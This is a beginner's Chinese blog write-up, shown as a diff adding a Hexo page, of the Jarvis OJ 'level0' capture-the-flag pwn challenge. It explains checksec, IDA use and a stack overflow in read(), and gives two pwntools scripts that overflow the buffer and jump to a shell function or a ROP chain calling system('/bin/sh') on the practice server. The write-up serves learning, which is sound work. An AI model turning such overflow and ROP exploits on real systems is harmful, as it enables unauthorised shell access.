@@ -1,0 +1,53 @@
+<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.9.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>level0 | wolcome</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/normalize/8.0.1/normalize.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//lib.baomitu.com/jquery/3.4.0/jquery.min.js"></script><link rel="icon" mask sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">level0</h1><a id="logo" href="/.">wolcome</a><p class="description"></p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> Home</i></a><a href="/archives/"><i class="fa fa-archive"> Archive</i></a><a href="/about/"><i class="fa fa-user"> About</i></a><a href="/atom.xml"><i class="fa fa-rss"> RSS</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">level0</h1><div class="post-meta">Aug 8, 2019</div><div class="post-content"><a id="more"></a>
+
+<p>1.首先要用到</p>
+<pre><code>&apos;file&apos;  ，来查看用多少位的ida打开。
+&apos;checksec&apos; ，用来查看文件的保护机制</code></pre><p><img src="/2019/08/08/level0/checksec.png" alt></p>
+<pre><code>Stack 的作用是防止栈的溢出
+NX    的作用为防止栈中的可执行代码
+  其他的我还不太了解，以后再说</code></pre><p>2.ida基本操作</p>
+<pre><code>首先打开文件后可以按空格键，查看地址与汇编指令
+在功能表里找到main,便于分析程序
+按tab键会出现伪代码，我们分析这个来找出漏洞
+shift+F12可以出现字符串表
+ctrl+F 可以出现查找框
+想查找某个变量的地址，只需点击后按tab键</code></pre><p>3.本题所涉及的知识</p>
+<pre><code>首先查找漏洞在read函数，可以通过栈的溢出来覆盖函数的返回地址
+这里要了解一下栈的基本结构以及如何传递内容
+然后调用callsystem函数来获取shell</code></pre><p><img src="/2019/08/08/level0/z.png" alt></p>
+<p>4.脚本的书写</p>
+<pre><code>1.from pwn import *
+    (导入pwn里的内容)
+2.p=remote(&apos;地址&apos;,端口)
+    （连接服务器并创建一个对象）、
+3.p.recv()  p.recvline() p.recvuntil()
+    (都是接受服务器返回的字符串，具体区别不太懂)
+4.p.send()  p.sendline() p.sendafter()
+    (都是向服务器传入字符串，具体区别不太懂)
+5.p.interactive()
+    (结尾加上，啥意思不懂)</code></pre><p>5.本题payload的构建</p>
+<pre><code>1.buf距离rbp 0x80，rbp本身占位8
+2.函数返回地址可填callsystem的地址
+3.payload=ox88*&apos;a&apos;+addr_callsystem</code></pre><p>6.产生的问题及解决</p>
+<pre><code>1.做完level1，你会想用system函数及“/bin/sh”字符串传参来做level0，但是本题并不能用
+    payload=0x88*&apos;a&apos;+p64(addr_system)+p64(0)+p64(addr_binsh)
+2.为什么呢？原来是因为64位的传参并不是由直接栈传入，而是储存在寄存器里，所以payload的构建也要改变。
+当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9
+当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</code></pre><p><img src="/2019/08/08/level0/rop.png" alt></p>
+<pre><code>3.所以构建的payload为
+    payload=0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0)</code></pre><p>7.两种脚本：</p>
+<p>一</p>
+<p>`</p>
+<pre><code>#coding:utf-8
+from pwn import *
+p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)
+s_addr=0x0000000000400596
+p.sendafter(&quot;World\n&quot;,0x88*&apos;a&apos;+p64(s_addr))
+p.interactive()</code></pre><p><code>二</code></p>
+<pre><code> #coding:utf-8
+from pwn import *
+p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)
+rdi=0x400663
+p.sendafter(&quot;World\n&quot;,0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0))
+p.interactive()</code></pre><p>`</p>
+</div><div class="tags"><a href="/tags/做题题解/">做题题解</a></div><div class="post-nav"><a class="pre" href="/2019/08/08/p/">drops做题收获</a><a class="next" href="/2019/08/08/python/">python基本数据类型</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.baidu.com/baidu" method="get" accept-charset="utf-8" target="_blank"><input type="search" name="word" maxlength="20" placeholder="Search"><input type="hidden" name="si" value="http://yoursite.com"><input name="tn" type="hidden" value="bds"><input name="cl" type="hidden" value="3"><input name="ct" type="hidden" value="2097152"><input name="s" type="hidden" value="on"></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> Categories</i></div></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> Tags</i></div><div class="tagcloud"><a href="/tags/做题题解/" style="font-size: 15px;">做题题解</a> <a href="/tags/语言基础/" style="font-size: 15px;">语言基础</a> <a href="/tags/有关栈/" style="font-size: 15px;">有关栈</a> <a href="/tags/虚拟机配置/" style="font-size: 15px;">虚拟机配置</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> Recent</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/10/11/stack2/">stack2</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/11/ubuntu16-04配置/">ubuntu16.04配置</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/27/stack_explain/">stack</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/08/p/">drops做题收获</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/08/level0/">level0</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/08/python/">python基本数据类型</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> Links</i></div><ul></ul><a href="https://nocbtm.github.io/learn/" title="jing" target="_blank">jing</a><ul></ul><a href="http://www.example2.com/" target="_blank"></a><ul></ul><a href="http://www.example3.com/" target="_blank"></a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2019 <a href="/." rel="nofollow">wolcome.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>
